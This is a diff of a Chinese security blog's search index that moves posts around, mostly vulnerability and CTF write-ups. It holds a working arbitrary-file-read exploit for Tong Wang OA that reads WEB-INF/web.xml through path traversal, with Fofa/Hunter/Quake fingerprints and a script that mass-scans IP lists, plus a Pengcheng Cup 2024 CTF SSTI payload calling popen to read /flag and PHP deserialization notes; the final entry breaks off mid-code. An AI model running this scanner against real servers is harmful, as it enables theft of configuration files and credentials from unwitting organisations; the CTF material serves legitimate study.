@@ -27,32 +27,6 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>RG-NBS2026G-P unauthorized</title>
-    <url>/2024/11/08/CNVD-2024-00980/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="3474e85e5dc0d15b90873b22070a171e0cbf15fcb6d6f06a8fa21bb993ead31a">4b3ecdb6537e7115dee2acf67d9afff9009043d9ff2ae132b1ee3d617aaf8a1ddb5338a8ebd15cff35116550d93243bf13f5116ac6fca5f320bafc0fec905bf7f6d9421b270cbd357bf11670997496f47db331e6be8b830c08a7e50b62167297efdfe38b1fc23008264615e9686e72b294f873ec1d1ac9e264523d69ad982f5c8df6ae26ff42860fd730cc23b1366ca0bea5c2795c7c07e797fab8e185a65ce22c9e0726f689387ca2ce7b348e661dfce9a98ee9a566c1cfdaf8cc1785d28b4e66a89724c86d62fb7c3ee1dd4f82b7040aeb2c48e025049888497509a595c736b10b51619d450b76446f85deb11016f420010ec05f552ba463b8dff89704dfc5d19dd6b8765f430d750fe70edb971c103d0e476dba04c24c39257c2331cf46d69d6718d75b12a5101011e261f93f404586ec846a3fee3f7d04b6aadbac76cef0e46b6aeb301a97c269f75c507d7bb98e1421596a8e3a00c5132e5342fd3321216a09868b44205d7e8916423db8025522d10d486e8858f7e0a90ef368ce3127ce98165d37c22196c52cab789ab5a700ee1c4482f87d9f85600522a94d13918d1edf523d9b6fee3ef11b8535995815acc9cd3f2f83b59c044767518dec8d8af91b81542cc81d176f4dee691b56fe904f3915b563db7cebc34c689a3bff62495f961be6739d735f0c6e3b206136a7d78fa1aa21007da8ad9c1ef623178f4eeacf5ffd93422377af9031ad7f6ced2eaae4d34c169a1ac70040c0cd84f18a39b13ed7d50983d1d20e4968883fd89c88dbc242a34a4d5ff075427d2af25a77d3cd1713a4b7bba68b1b0617429f3c5158e1728aca1054805e7de22b65a27e97bbf8e4cbf825aa472792ab214ffad630bafec1fb2d12e4fcb82565d4a271982d111cea4d605832f0397fe9aae94e71c516b1a6fc5a56ef3c10ba2daf053a6f24d60931897cdc67c4bd62e1ed69d49e2d36492a4f496bf7f2a8fd5baf42b52f26f208f8ea24a6607a04d1a0dfe156fedbff6af5988d0407f4f6ed5ed81f4732b3e66f7fdee9d6bd42c71a364916d5cd89e8277a17ffc5587f490f321cfa01c5fda7f78ddff4cdf5dfb53050e7db29dd164c5577d2c7f26f7525fd48e8c26dc744907df0b8f560f20c6c68d28e1fba006bf9a5021e754fee4a2298fd4a90b4847ea185ae0e8ae5c480bb11447ed9cfb3945e8154ddc259ee6ff78f0c39b818494c92574c5ebcd1797dea28e9d7b8ebb1f2821876e14476a22fcf96ef637c00e7334dba9a8dda410044ad22d22263b22610565038322c0f036db09d40f2483f9c355dd4e957d8ded5c18f3d5ea39b9b0f8370c60eb75aa5770e3633c33c29d6d4a0c4b82711354274dc4d52854400d640a222bf6e1089fff0c0416e4a441a6fc496cc3c5d5167d3bdafb8fc69d8c5b87c6f213a0fd24e004e7a69305036fa41a55c990e3ca5c1613f64b440e33d9967cb0bb4f24980240f68ce6964ed3052cc3cc8c35bcde3e4482e833c433fb716afa1d34267949f210b6d727051c59f257cf25bfab944d6dbead22e6c35a162a04656239ceb5a3f5b619bd2a5c4b2893a20a5907745fbf12fbf4b429650180765ccfa0d0d94e709c2b6d979d6c29a2b0f0cb70136ac3e12b7b6d671aa7769f49a4ae2254869bc6342c8e1519b917571fb2a42b214ea3cb7441a7561356e5efe595a2cc014e18863ecdb00c18f7abd7d80b80da87f96be3c51b003061c29565e1daa4159ef045e7ff61c8bf72ebbe7cd64b854f60f8c95c7e7c17bc847ac0553f48976fa87852344650bf1345b9c51a5c9a1f5e3f035442853008d6807d7936136dd2b9c0c3ea6b9</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
-<script data-swup-reload-script type="module">
-import {initHBE} from "/js/plugins/hbe.js";
-  console.log("hexo-blog-encrypt: loaded.");
-    initHBE();
-</script>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Wei Ning sql inject</title>
     <url>/2024/11/08/CNVD-2024-13639/</url>
     <content><![CDATA[
@@ -131,6 +105,32 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
+    <title>RG-NBS2026G-P unauthorized</title>
+    <url>/2024/11/08/CNVD-2024-00980/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="3474e85e5dc0d15b90873b22070a171e0cbf15fcb6d6f06a8fa21bb993ead31a">4b3ecdb6537e7115dee2acf67d9afff9009043d9ff2ae132b1ee3d617aaf8a1ddb5338a8ebd15cff35116550d93243bf13f5116ac6fca5f320bafc0fec905bf7f6d9421b270cbd357bf11670997496f47db331e6be8b830c08a7e50b62167297efdfe38b1fc23008264615e9686e72b294f873ec1d1ac9e264523d69ad982f5c8df6ae26ff42860fd730cc23b1366ca0bea5c2795c7c07e797fab8e185a65ce22c9e0726f689387ca2ce7b348e661dfce9a98ee9a566c1cfdaf8cc1785d28b4e66a89724c86d62fb7c3ee1dd4f82b7040aeb2c48e025049888497509a595c736b10b51619d450b76446f85deb11016f420010ec05f552ba463b8dff89704dfc5d19dd6b8765f430d750fe70edb971c103d0e476dba04c24c39257c2331cf46d69d6718d75b12a5101011e261f93f404586ec846a3fee3f7d04b6aadbac76cef0e46b6aeb301a97c269f75c507d7bb98e1421596a8e3a00c5132e5342fd3321216a09868b44205d7e8916423db8025522d10d486e8858f7e0a90ef368ce3127ce98165d37c22196c52cab789ab5a700ee1c4482f87d9f85600522a94d13918d1edf523d9b6fee3ef11b8535995815acc9cd3f2f83b59c044767518dec8d8af91b81542cc81d176f4dee691b56fe904f3915b563db7cebc34c689a3bff62495f961be6739d735f0c6e3b206136a7d78fa1aa21007da8ad9c1ef623178f4eeacf5ffd93422377af9031ad7f6ced2eaae4d34c169a1ac70040c0cd84f18a39b13ed7d50983d1d20e4968883fd89c88dbc242a34a4d5ff075427d2af25a77d3cd1713a4b7bba68b1b0617429f3c5158e1728aca1054805e7de22b65a27e97bbf8e4cbf825aa472792ab214ffad630bafec1fb2d12e4fcb82565d4a271982d111cea4d605832f0397fe9aae94e71c516b1a6fc5a56ef3c10ba2daf053a6f24d60931897cdc67c4bd62e1ed69d49e2d36492a4f496bf7f2a8fd5baf42b52f26f208f8ea24a6607a04d1a0dfe156fedbff6af5988d0407f4f6ed5ed81f4732b3e66f7fdee9d6bd42c71a364916d5cd89e8277a17ffc5587f490f321cfa01c5fda7f78ddff4cdf5dfb53050e7db29dd164c5577d2c7f26f7525fd48e8c26dc744907df0b8f560f20c6c68d28e1fba006bf9a5021e754fee4a2298fd4a90b4847ea185ae0e8ae5c480bb11447ed9cfb3945e8154ddc259ee6ff78f0c39b818494c92574c5ebcd1797dea28e9d7b8ebb1f2821876e14476a22fcf96ef637c00e7334dba9a8dda410044ad22d22263b22610565038322c0f036db09d40f2483f9c355dd4e957d8ded5c18f3d5ea39b9b0f8370c60eb75aa5770e3633c33c29d6d4a0c4b82711354274dc4d52854400d640a222bf6e1089fff0c0416e4a441a6fc496cc3c5d5167d3bdafb8fc69d8c5b87c6f213a0fd24e004e7a69305036fa41a55c990e3ca5c1613f64b440e33d9967cb0bb4f24980240f68ce6964ed3052cc3cc8c35bcde3e4482e833c433fb716afa1d34267949f210b6d727051c59f257cf25bfab944d6dbead22e6c35a162a04656239ceb5a3f5b619bd2a5c4b2893a20a5907745fbf12fbf4b429650180765ccfa0d0d94e709c2b6d979d6c29a2b0f0cb70136ac3e12b7b6d671aa7769f49a4ae2254869bc6342c8e1519b917571fb2a42b214ea3cb7441a7561356e5efe595a2cc014e18863ecdb00c18f7abd7d80b80da87f96be3c51b003061c29565e1daa4159ef045e7ff61c8bf72ebbe7cd64b854f60f8c95c7e7c17bc847ac0553f48976fa87852344650bf1345b9c51a5c9a1f5e3f035442853008d6807d7936136dd2b9c0c3ea6b9</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
+<script data-swup-reload-script type="module">
+import {initHBE} from "/js/plugins/hbe.js";
+  console.log("hexo-blog-encrypt: loaded.");
+    initHBE();
+</script>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ezOffice Sql Inject</title>
     <url>/2024/11/08/DVB-2024-7947/</url>
     <content><![CDATA[
@@ -177,6 +177,51 @@ import {initHBE} from "/js/plugins/hbe.js";
   console.log("hexo-blog-encrypt: loaded.");
     initHBE();
 </script>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tong Wang OA tooneAssistantAttachement File read</title>
+    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
+    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
+<p>​
+同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
+<ul>
+<li>Fofa：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Hunter：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Quake：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<h4 id="利用脚本">利用脚本</h4>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
 ]]></content>
       <tags>
         <tag>day</tag>
@@ -282,51 +327,6 @@ alt="image.png"
       </tags>
   </entry>
   <entry>
-    <title>Tong Wang OA tooneAssistantAttachement File read</title>
-    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
-    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
-<p>​
-同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
-<ul>
-<li>Fofa：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Hunter：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Quake：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<h4 id="利用脚本">利用脚本</h4>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>逆向值定位</title>
     <url>/2024/11/07/js_nixiang_1/</url>
     <content><![CDATA[<h2 id="思路">思路</h2>
@@ -348,23 +348,6 @@ alt="image.png"
 ]]></content>
       <tags>
         <tag>JS逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>鹏城杯2024-python口算</title>
-    <url>/2024/11/09/pcb2024-python-calc/</url>
-    <content><![CDATA[<p>队友yeepie师傅做出来的，队友yeepie师傅做出来的，队友yeepie师傅做出来的</p>
-<p>我是搬运我是搬运我是搬运</p>
-<h2 id="python口算">python口算</h2>
-<p>1秒内计算算式，从页面中获取到乘法算式，很常见的题目，正则python发包，gpt一句话的事</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br></pre></td></tr></table></figure></div>
-<p>成功 返回/static/f4dd790b-bc4e-48de-b717-903d433c597f</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<p>ssti打即可</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">是ssti 过滤了空格，$&#123;IFS&#125;绕过即可拿到flag</span><br><span class="line">notadmin-pcb2024</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()</span></span><br><span class="line"><span class="string">[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat$&#123;IFS&#125;/flag&#x27;).read()&#125;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">response_post = requests.post(submit_url, data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交后的响应页面（POST）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_post.text)</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <tags>
-        <tag>竞赛复盘</tag>
       </tags>
   </entry>
   <entry>
@@ -393,6 +376,23 @@ alt="image.png"
 <p>危险函数黑名单，有时候想不明白从哪打漏洞点就可以从黑名单处逆推。上面的代码可以看出来校验的是sessionData，这玩意又明文传输，往这里打没跑了，更别提最上面还有个带eval的类：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p>因为filterSensitiveFunctions()中进行了置空，所以直接从session里打反序列化逃逸触发notouchitsclass类再双写绕过即可</p>
+]]></content>
+      <tags>
+        <tag>竞赛复盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>鹏城杯2024-python口算</title>
+    <url>/2024/11/09/pcb2024-python-calc/</url>
+    <content><![CDATA[<p>队友yeepie师傅做出来的，队友yeepie师傅做出来的，队友yeepie师傅做出来的</p>
+<p>我是搬运我是搬运我是搬运</p>
+<h2 id="python口算">python口算</h2>
+<p>1秒内计算算式，从页面中获取到乘法算式，很常见的题目，正则python发包，gpt一句话的事</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br></pre></td></tr></table></figure></div>
+<p>成功 返回/static/f4dd790b-bc4e-48de-b717-903d433c597f</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span 